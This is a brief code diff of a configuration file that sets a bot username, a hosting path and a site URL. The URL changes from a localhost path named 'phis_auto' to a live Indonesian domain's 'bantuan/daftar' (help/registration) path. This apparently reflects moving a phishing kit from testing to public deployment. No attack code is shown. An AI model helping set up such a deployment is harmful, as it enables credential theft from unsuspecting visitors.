@@ -7,4 +7,4 @@ bot_username = "qpqpqpqbbot"
 showperpage = 50
 
 path = "/home/indones9/public_html/bantuan/xcoba/"
-url = "http://localhost:8012/phis_auto/"
+url = "http://indonesia-terkini.my.id/bantuan/daftar/"
